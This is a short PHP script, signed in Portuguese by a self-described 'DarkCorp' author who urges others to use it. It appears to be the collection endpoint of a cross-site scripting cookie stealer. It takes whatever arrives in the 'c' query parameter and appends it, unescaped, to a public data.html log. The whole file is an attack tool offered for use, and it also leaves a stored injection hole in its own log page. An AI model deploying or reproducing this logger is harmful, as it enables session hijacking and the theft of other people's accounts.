<!-- Feito Por John Dark - DarkCorp -->
<!-- Usem bastante -->>
<?php
if (!empty($_GET['c'])) {
    $logfile = fopen('data.html', 'a');
    $log = '<center>' . $_GET['c'] . '</center><br>';
    fwrite($logfile, $log);
    fclose($logfile);
}
?>